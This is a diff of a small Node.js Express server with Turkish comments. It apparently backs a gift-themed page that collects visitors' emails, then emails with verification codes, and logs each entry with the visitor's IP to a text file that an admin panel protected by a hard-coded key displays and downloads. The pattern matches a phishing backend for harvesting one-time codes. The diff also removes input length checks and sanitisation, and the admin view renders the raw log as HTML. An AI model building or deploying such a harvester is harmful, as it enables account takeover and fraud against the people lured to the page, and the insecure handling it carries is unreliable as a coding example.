@@ -1,3 +1,4 @@
+
 const express = require('express');
 const fs = require('fs');
 const path = require('path');
@@ -6,86 +7,80 @@ const cors = require('cors');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
-// Basit bir "admin anahtarı"
+// Admin paneline giriş için gizli anahtar (Tarayıcıda: /admin?key=anahtar)
 const ADMIN_KEY = 'benim-gizli-anahtarim';
 
-// Frontend dosyaları (public klasörü)
+// Statik dosyaları (index.html, gift.html) 'public' klasöründen okur
 app.use(express.static(path.join(__dirname, 'public')));
-
-// JSON body okumak için
 app.use(express.json({ limit: '1mb' }));
 app.use(cors());
 
-// Kayıt dosyası
 const SUBMISSIONS_FILE = path.join(__dirname, 'submissions.txt');
 
-// Kayıt satırı biçimi
-function formatEntry({ uid, level, ip }) {
-  const time = new Date().toISOString();
-  return `${time} | ${ip} | ${uid} | ${level}\n`;
+// --- YARDIMCI FONKSİYONLAR ---
+
+function formatEntry(type, data) {
+  const time = new Date().toLocaleString('tr-TR');
+  if (type === 'EMAIL') {
+    return `[${time}] | IP: ${data.ip} | YENİ GİRİŞ: ${data.email}\n`;
+  } else {
+    return `[${time}] | IP: ${data.ip} | KOD GÖNDERİLDİ: Email=${data.email} | Kod=${data.code}\n`;
+  }
 }
 
-// Basit doğrulama
-function isValidInput(uid, level) {
-  if (!uid || !level) return false;
-  if (uid.length > 200 || level.length > 200) return false;
-  return true;
-}
+// --- ENDPOINT'LER ---
 
-// Veri alma endpoint'i
+// 1. E-posta Kaydı (index.html'den gelir)
 app.post('/submit', (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
-  const { uid, level } = req.body || {};
+  const { email } = req.body || {};
 
-  if (!isValidInput(uid, level)) {
-    return res.status(400).json({ ok: false, message: 'UID ve Level zorunlu ve 200 karakteri geçmemeli.' });
+  if (!email || !email.includes('@')) {
+    return res.status(400).json({ ok: false, message: 'Geçersiz e-posta.' });
   }
 
-  const safeUid = String(uid).replace(/\r|\n/g, ' ');
-  const safeLevel = String(level).replace(/\r|\n/g, ' ');
-
-  const entry = formatEntry({ uid: safeUid, level: safeLevel, ip });
+  const entry = formatEntry('EMAIL', { email, ip });
 
   fs.appendFile(SUBMISSIONS_FILE, entry, (err) => {
-    if (err) {
-      console.error('Dosyaya yazarken hata:', err);
-      return res.status(500).json({ ok: false, message: 'Sunucu hatası.' });
-    }
-    return res.json({ ok: true, message: 'Kayıt alındı.' });
+    if (err) return res.status(500).json({ ok: false });
+    return res.json({ ok: true });
   });
 });
 
-// Admin görünümü
+// 2. Kod Kaydı (gift.html'den gelir)
+app.post('/submit-code', (req, res) => {
+  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
+  const { email, code } = req.body || {};
+
+  if (!email || !code) {
+    return res.status(400).json({ ok: false, message: 'E-posta ve kod zorunlu.' });
+  }
+
+  const entry = formatEntry('CODE', { email, code, ip });
+
+  fs.appendFile(SUBMISSIONS_FILE, entry, (err) => {
+    if (err) return res.status(500).json({ ok: false });
+    return res.json({ ok: true });
+  });
+});
+
+// 3. Admin Paneli (Kayıtları görüntülemek için)
 app.get('/admin', (req, res) => {
-  const key = req.query.key;
-  if (key !== ADMIN_KEY) {
-    return res.status(403).send('<h3>Yetkisiz. key parametresi hatalı.</h3>');
+  if (req.query.key !== ADMIN_KEY) {
+    return res.status(403).send('Yetkisiz erişim.');
   }
 
   fs.readFile(SUBMISSIONS_FILE, 'utf8', (err, data) => {
-    const content = err ? 'Henüz kayıt yok ya da dosya okunamadı.' : data;
+    const content = err ? 'Henüz kayıt yok.' : data;
     const html = `
-      <!doctype html>
-      <html lang="tr">
-        <head>
-          <meta charset="utf-8" />
-          <title>Admin Kayıtlar</title>
-          <style>
-            body { font-family: sans-serif; max-width: 900px; margin: 40px auto; line-height: 1.6; }
-            pre { background: #f4f4f4; padding: 16px; border-radius: 8px; overflow: auto; white-space: pre-wrap; }
-            .top { display: flex; justify-content: space-between; align-items: center; }
-            .btns a { margin-right: 12px; }
-          </style>
-        </head>
-        <body>
-          <div class="top">
-            <h2>Kayıtlar (en altta en eski)</h2>
-            <div class="btns">
-              <a href="/download?key=${ADMIN_KEY}">Metin dosyasını indir</a>
-              <a href="/admin?key=${ADMIN_KEY}">Yenile</a>
-            </div>
-          </div>
+      <html>
+        <head><title>Admin Panel</title><meta charset="utf-8"></head>
+        <body style="font-family:monospace; background:#111; color:#0f0; padding:20px;">
+          <h2>Gelen Veriler (submissions.txt)</h2>
+          <hr>
           <pre>${content}</pre>
+          <br>
+          <a href="/download?key=${ADMIN_KEY}" style="color:white;">Dosyayı İndir (.txt)</a>
         </body>
       </html>
     `;
@@ -93,47 +88,13 @@ app.get('/admin', (req, res) => {
   });
 });
 
-// Dosyayı indirme
+// 4. Dosya İndirme
 app.get('/download', (req, res) => {
-  const key = req.query.key;
-  if (key !== ADMIN_KEY) {
-    return res.status(403).send('Yetkisiz');
-  }
-  if (!fs.existsSync(SUBMISSIONS_FILE)) {
-    return res.status(404).send('Henüz kayıt dosyası yok.');
-  }
-  res.download(SUBMISSIONS_FILE, 'submissions.txt');
-});
-// KOD gönderimi için endpoint (gift.html'den gelecek)
-app.post('/submit-code', (req, res) => {
-  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
-  const { email, code } = req.body || {};
-
-  // Basit kontrol
-  if (!email || !code) {
-    return res.status(400).json({ ok: false, message: 'E-posta ve Kod zorunlu.' });
-  }
-  if (email.length > 200 || code.length > 200) {
-    return res.status(400).json({ ok: false, message: 'E-posta/Kod 200 karakteri geçmemeli.' });
-  }
-
-  // Dosyaya düzgün yazmak için satır sonlarını temizle
-  const safeEmail = String(email).replace(/\r|\n/g, ' ');
-  const safeCode = String(code).replace(/\r|\n/g, ' ');
-
-  const time = new Date().toISOString();
-  const entry = `${time} | ${ip} | CODE_SUBMIT | email=${safeEmail} | code=${safeCode}\n`;
-
-  fs.appendFile(SUBMISSIONS_FILE, entry, (err) => {
-    if (err) {
-      console.error('Kod yazarken hata:', err);
-      return res.status(500).json({ ok: false, message: 'Sunucu hatası.' });
-    }
-    return res.json({ ok: true, message: 'Kod kaydedildi.' });
-  });
+  if (req.query.key !== ADMIN_KEY) return res.status(403).send('Yetkisiz.');
+  res.download(SUBMISSIONS_FILE);
 });
 
-// Sunucu başlat
 app.listen(PORT, () => {
-  console.log(`Sunucu çalışıyor: http://localhost:${PORT}`);
+  console.log(`Sunucu aktif: http://localhost:${PORT}`);
 });
+
